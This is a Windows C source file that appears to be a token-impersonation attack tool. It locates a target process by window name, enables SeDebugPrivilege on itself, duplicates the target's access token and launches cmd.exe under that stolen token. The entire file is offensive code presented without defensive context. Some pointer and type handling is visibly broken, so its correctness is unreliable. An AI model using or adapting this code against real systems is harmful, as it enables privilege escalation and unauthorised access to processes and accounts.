#include <Windows.h>
#include <stdio.h>

//typedef struct _PRIVILEGE_SET {
//	DWORD               PrivilegeCount;
//	DWORD               Control;
//	LUID_AND_ATTRIBUTES Privilege[ANYSIZE_ARRAY];
//} PRIVILEGE_SET, * PPRIVILEGE_SET;

//typedef struct _TOKEN_PRIVILEGES {
//	DWORD               PrivilegeCount;
//	LUID_AND_ATTRIBUTES Privileges[ANYSIZE_ARRAY];
//} TOKEN_PRIVILEGES, * PTOKEN_PRIVILEGES;

HANDLE openProcessByPID(DWORD pid);
HANDLE openProcToken(HANDLE pHandle);
DWORD enablePrivilege(LPCWSTR priv, HANDLE handle);

int wmain(int argc, wchar_t** argv)
{
	LPCSTR lpClassName;
	wchar_t wcWindowName[100];

	printf("Enter window name to hook into: ");
	scanf("%[^\n]%*c", &wcWindowName);
	printf("Window Name: %s\n", wcWindowName);

	/*
	HWND FindWindowA(
  LPCSTR lpClassName,
  LPCSTR lpWindowName
);*/

	HWND hWnd = FindWindowA(NULL, (LPCSTR)wcWindowName);

	if (hWnd == NULL)
	{
		printf("[ERROR] Could not find window, Error Code: %ld\n", GetLastError());
		return 1;
	}

	DWORD dwProcessId;

	/*
	DWORD GetWindowThreadProcessId(
	HWND    hWnd,
	LPDWORD lpdwProcessId
);*/
	DWORD dwThreadId = GetWindowThreadProcessId(hWnd, &dwProcessId);

	if (dwThreadId == 0)
	{
		printf("[ERROR] Could Not Get PID from Handle! Error Code: %ld", GetLastError());
		return 1;
	}
	else
		printf("[INFO] Found PID\n");

	HANDLE TokenHandle = openProcToken(openProcessByPID(dwProcessId));

	HANDLE currentProcessHandle = openProcToken(openProcessByPID(GetCurrentProcessId()));

	printf("[INFO] Enabling SEDebugPrivilege on Current Process..\n");

	int r = enablePrivilege(L"SEDebugPrivilege", currentProcessHandle);

	if (r != 0)
	{
		printf("[ERROR] Could Not Enable Privileges...\n");
		return 1;
	}

	PHANDLE phNewToken = NULL;
	DWORD dwDesiredAccess = TOKEN_ALL_ACCESS;
	SECURITY_ATTRIBUTES lpTokenAttributes;
	memset(&lpTokenAttributes, 0, sizeof lpTokenAttributes);

	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel = 2;
	TOKEN_TYPE TokenType = TokenImpersonation;

	lpTokenAttributes.bInheritHandle = FALSE;
	lpTokenAttributes.lpSecurityDescriptor = NULL;
	lpTokenAttributes.nLength = sizeof(lpTokenAttributes);

	printf("[INFO] Duplicating Token on Hooked Process...\n");

	r = DuplicateTokenEx(TokenHandle, dwDesiredAccess, &lpTokenAttributes, ImpersonationLevel, TokenType, &phNewToken);

	if (r == 0)
	{
		printf("[ERROR] Could Not Duplicate Token... Error Code: %ld", GetLastError());
		return 1;
	}

	PHANDLE hToken = phNewToken;
	DWORD dwLogonFlags = 0x00000001;
	LPCWSTR lpApplicationName = L"C:\\Windows\\System32\\cmd.exe";
	LPWSTR lpCommandLine = NULL;
	DWORD dwCreationFlags = 0x00000010;
	LPVOID lpEnvironment = NULL;
	LPCWSTR lpCurrentDirectory = NULL;
	STARTUPINFOW lpStartupInfo ;
	memset(&lpStartupInfo, 0, sizeof lpStartupInfo);

	PROCESS_INFORMATION lpProcessInformation;
	memset(&lpProcessInformation, 0, sizeof lpProcessInformation);

	lpStartupInfo.wShowWindow = 0x1;
	lpStartupInfo.dwFlags = 0x1;
	lpStartupInfo.cb = sizeof(lpStartupInfo);

	r = CreateProcessWithTokenW(hToken, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, 
		lpCurrentDirectory, &lpStartupInfo, &lpProcessInformation);

	if (r == 0)
	{
		printf("[ERROR] Could Not Create Process With Duplicated Token... Error Code:  %ld", GetLastError());
		return 1;
	}

	printf("[INFO] Created Impersonated Proces!\n");

	CloseHandle(hToken);

	return 0;
}

HANDLE openProcessByPID(DWORD pid)
{
	DWORD dwDesiredAccess = PROCESS_ALL_ACCESS;
	BOOL bInheritHandle = FALSE;
	DWORD dwProcessId = pid;

	HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId);

	if (hProcess <= 0)
	{
		printf("[ERROR] Could Not Grab Privileged Handle! Error Code: %ld\n", GetLastError());
		return 1;
	}

	printf("[INFO] Privileged Handle Opened...\n");

	return hProcess;
}

HANDLE openProcToken(HANDLE pHandle)
{
	HANDLE ProcessHandle = pHandle;
	DWORD DesiredAccess = TOKEN_ALL_ACCESS;
	PHANDLE TokenHandle = NULL;

	int r = OpenProcessToken(ProcessHandle, DesiredAccess, &TokenHandle);

	if (r > 0)
	{
		printf("[INFO] Handle to Process Token Created! Token: %ld\n", TokenHandle);
		return TokenHandle;
	}
	else
	{
		printf("[ERROR] Could Not Grab Privileged Handle to Token! Error Code: %ld\n", GetLastError());
		return 1;
	}
}

DWORD enablePrivilege(LPCWSTR priv, HANDLE handle)
{
	PRIVILEGE_SET requiredPrivileges;
	requiredPrivileges.PrivilegeCount = 1;	

	LPCWSTR lpSystemName = NULL;
	LPCWSTR lpName = priv;

	/*BOOL LookupPrivilegeValueA(
		LPCSTR lpSystemName,
		LPCSTR lpName,
		PLUID  lpLuid
	);*/

	int r = LookupPrivilegeValueW(lpSystemName, lpName, &requiredPrivileges.Privilege->Luid);

	if (r != 0)
		printf("[INFO] Lookup For %s Worked...\n", priv);
	else
	{
		printf("[ERROR] Lookup for %s Failed! Error Code: %ld\n", priv, GetLastError());
		return 1;
	}

	LPBOOL pfResult = NULL;

	/*BOOL PrivilegeCheck(
		HANDLE         ClientToken,
		PPRIVILEGE_SET RequiredPrivileges,
		LPBOOL         pfResult
	);*/

	r = PrivilegeCheck(handle, &requiredPrivileges, &pfResult);

	if (r != 0)
		printf("[INFO] PrivilegeCheck Worked...\n");
	else
	{
		printf("[ERROR] PrivilegeCheck Failed! Error Code: %ld\n", GetLastError());
		return 1;
	}

	if (pfResult)
	{
		printf("[INFO] Privilege SEDebugPrivilege is Enabled...\n");
		return 0;
	}
	else
	{
		printf("[INFO] Privilege SEDebugPrivilege is NOT Enabled...\n");
		requiredPrivileges.Privilege->Attributes = SE_PRIVILEGE_ENABLED;
	}

	BOOL DisableAllPrivileges = FALSE;
	TOKEN_PRIVILEGES NewState;
	memset(&NewState, 0, sizeof NewState);
	DWORD BufferLength = sizeof(NewState);
	PTOKEN_PRIVILEGES PreviousState = NULL;
	PDWORD ReturnLength = NULL;

	NewState.PrivilegeCount = 1;
	*NewState.Privileges = *requiredPrivileges.Privilege;

	/*BOOL AdjustTokenPrivileges(
		HANDLE            TokenHandle,
		BOOL              DisableAllPrivileges,
		PTOKEN_PRIVILEGES NewState,
		DWORD             BufferLength,
		PTOKEN_PRIVILEGES PreviousState,
		PDWORD            ReturnLength
	);*/

	r = AdjustTokenPrivileges(handle, DisableAllPrivileges, &NewState, BufferLength, PreviousState, ReturnLength);

	if (r != 0)
		printf("[INFO] AdjustTokenPrivileges Flipped Privilege...\n");
	else
	{
		printf("[ERROR] AdjustTokenPrivileges Failed! Error Code: %ld\n", GetLastError());
		return 1;
	}

	return 0;
}
